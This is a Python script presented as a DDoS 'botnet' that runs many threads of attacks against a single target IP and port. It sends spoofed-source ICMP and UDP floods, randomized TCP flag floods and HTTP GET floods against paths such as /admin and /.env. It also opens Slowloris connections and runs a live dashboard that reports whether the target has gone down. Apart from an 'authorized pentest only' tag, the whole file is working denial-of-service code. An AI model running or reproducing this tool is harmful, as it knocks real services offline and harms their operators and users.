#!/usr/bin/env python3
"""
🔥 ULTRA+ DDOS BOTNET v3.0 - 100K+ PPS | AUTHORIZED PENTEST ONLY
DOUBLED VOLUME: 384→768 THREADS | 200pkt→400pkt BURSTS | 100K+ PPS
"""
import socket, random, time, threading, argparse, signal, sys
from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP, ICMP
import psutil, requests
conf.verb = 0

class UltraPlusDDoSBotnet:
    def __init__(self, target_ip, target_port=80, threads=64):  # DOUBLED: 32→64
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads_per_vector = threads  # 64 THREADS/VECTOR
        self.stop_event = threading.Event()
        self.stats = {'l3': 0, 'l4': 0, 'l7': 0, 'http': 0, 'total': 0, 'conns': 0}
        self.stats_lock = threading.Lock()
        self.pps_target = 100000  # 100K+ PPS 💥
        
    def signal_handler(self, sig, frame):
        print("\n🛑 ULTRA+ BOTNET TERMINATED")
        self.stop_event.set()
        time.sleep(2); sys.exit(0)
    
    def update_stats(self, l3=0, l4=0, l7=0, http=0, conns=0):
        with self.stats_lock:
            self.stats['l3'] += l3; self.stats['l4'] += l4
            self.stats['l7'] += l7; self.stats['http'] += http
            self.stats['conns'] += conns; self.stats['total'] += l3+l4+l7+http
    
    def l3_mega_flood(self, thread_id):
        """💣 L3 MEGA-FLOOD - 40K+ PPS | 400pkts/burst (+100%)"""
        print(f"💣 L3-{thread_id:02d}: MEGA 40K+ PPS")
        burst_size = 400  # DOUBLED: 100→400
        
        while not self.stop_event.is_set():
            pkts_sent = 0
            try:
                for _ in range(burst_size):
                    # ICMP Flood (spoofed + bigger payloads)
                    icmp_pkt = IP(src=RandIP(), dst=self.target_ip)/ICMP(type=8)/Raw(load="A"*random.randint(1400,2000))
                    send(icmp_pkt, verbose=0)
                    
                    # UDP Mega Amplification
                    udp_pkt = IP(src=RandIP(), dst=self.target_ip)/UDP(
                        sport=RandShort(), dport=random.choice([53,123,11211,161])
                    )/Raw(load="A"*random.randint(1400,2000))
                    send(udp_pkt, verbose=0)
                    
                    pkts_sent += 2
                
                self.update_stats(l3=pkts_sent)
                
            except: pass
    
    def l4_hyper_syn(self, thread_id):
        """⚡ L4 HYPER SYN - 30K+ PPS | 100pkts/burst (+100%)"""
        print(f"⚡ L4-{thread_id:02d}: HYPER SYN 30K+ PPS")
        tcp_flags = ["S", "SA", "RA", "PA", "F"]
        burst_size = 100  # DOUBLED: 50→100
        
        while not self.stop_event.is_set():
            try:
                for _ in range(burst_size):
                    src_ip = RandIP(); src_port = RandShort()
                    pkt = IP(src=src_ip, dst=self.target_ip)/TCP(
                        sport=src_port, dport=self.target_port,
                        flags=random.choice(tcp_flags),
                        seq=RandInt(), window=65535
                    )/Raw(load="X"*1400)
                    send(pkt, verbose=0)
                    self.update_stats(l4=1)
            except: pass
    
    def l7_thunder_cannon(self, thread_id):
        """🌩️ L7 THUNDER CANNON - 10K+ RPS | 40reqs/burst (+100%)"""
        print(f"🌩️ L7-{thread_id:02d}: THUNDER 10K+ RPS")
        user_agents = ["Mozilla/5.0 (Chrome/120)", "curl/8.5", "python-requests/2.31"]
        paths = ["/", "/api", "/admin", "/login", "/.env"]
        burst_size = 40  # DOUBLED: 20→40
        
        session = requests.Session()
        
        while not self.stop_event.is_set():
            try:
                for _ in range(burst_size):
                    session.headers.update({'User-Agent': random.choice(user_agents)})
                    path = random.choice(paths) + '?' + ''.join(random.choices('abcdef123456789', k=15))
                    url = f"http://{self.target_ip}:{self.target_port}{path}"
                    resp = session.get(url, timeout=0.3)
                    self.update_stats(http=1)
            except:
                self.update_stats(l7=1)
    
    def slowloris_hyper(self, thread_id):
        """🐌 HYPER SLOWLORIS - 1000+ conns/thread"""
        print(f"🐌 SLOW-{thread_id:02d}: 1000+ conns")
        sockets = []
        
        # Rapid connection burst
        for _ in range(1000):  # DOUBLED capacity
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.target_ip, self.target_port))
                sock.send(f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n".encode())
                sockets.append(sock)
                self.update_stats(conns=1)
            except: pass
        
        while not self.stop_event.is_set():
            for sock in sockets[:]:
                try:
                    sock.send(f"X-a: {random.randint(1,9999)}\r\n".encode())
                except:
                    sockets.remove(sock)
            time.sleep(10)
    
    def live_dashboard(self):
        while not self.stop_event.is_set():
            try:
                latency = 999
                try:
                    start = time.time()
                    subprocess.run(["ping", "-c1", "-W1", self.target_ip], 
                                 capture_output=True, timeout=1)
                    latency = (time.time() - start)*1000
                except: pass
                
                http_status = "DOWN"
                try:
                    resp = requests.get(f"http://{self.target_ip}:{self.target_port}/", 
                                      timeout=0.5)
                    http_status = resp.status_code
                except: pass
                
                with self.stats_lock:
                    stats = self.stats.copy()
                
                pps = stats['total'] // 10
                print(f"\r💥 ULTRA+ IMPACT: {pps:>8,} PPS | {latency:>5.0f}ms | HTTP:{http_status} | CONNS:{stats['conns']:>4,} | TOTAL:{stats['total']:>10,}", end="")
            except: pass
            time.sleep(0.3)
    
    def launch_hyper_attack(self):
        signal.signal(signal.SIGINT, self.signal_handler)
        
        print(f"\n🤖 ULTRA+ DDOS BOTNET v3.0 - 100K+ PPS")
        print(f"🎯 TARGET: {self.target_ip}:{self.target_port}")
        print(f"⚡ {self.threads_per_vector*4*2} THREADS | 100K+ PPS | HYPER VOLUME")
        print("═" * 100)
        
        threads = []
        
        # MEGA L3 (64x)
        for i in range(self.threads_per_vector): 
            t = threading.Thread(target=self.l3_mega_flood, args=(i+1,), daemon=True)
            t.start(); threads.append(t)
        
        # HYPER L4 (64x)
        for i in range(self.threads_per_vector):
            t = threading.Thread(target=self.l4_hyper_syn, args=(i+1,), daemon=True)
            t.start(); threads.append(t)
        
        # THUNDER L7 (64x)
        for i in range(self.threads_per_vector):
            t = threading.Thread(target=self.l7_thunder_cannon, args=(i+1,), daemon=True)
            t.start(); threads.append(t)
        
        # HYPER SLOWLORIS (32x)
        for i in range(self.threads_per_vector//2):
            t = threading.Thread(target=self.slowloris_hyper, args=(i+1,), daemon=True)
            t.start(); threads.append(t)
        
        # DASHBOARD
        monitor = threading.Thread(target=self.live_dashboard, daemon=True)
        monitor.start()
        
        try:
            while not self.stop_event.is_set(): time.sleep(0.1)
        except KeyboardInterrupt: pass
        
        with self.stats_lock:
            final = self.stats.copy()
        print(f"\n✅ ULTRA+ TERMINATED | TOTAL: {final['total']:>12,} pkts")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="🔥 ULTRA+ DDOS BOTNET v3.0")
    parser.add_argument("--target", required=True)
    parser.add_argument("--port", type=int, default=8080)
    parser.add_argument("--threads", type=int, default=64)
    args = parser.parse_args()
    
    botnet = UltraPlusDDoSBotnet(args.target, args.port, args.threads)
    botnet.launch_hyper_attack()
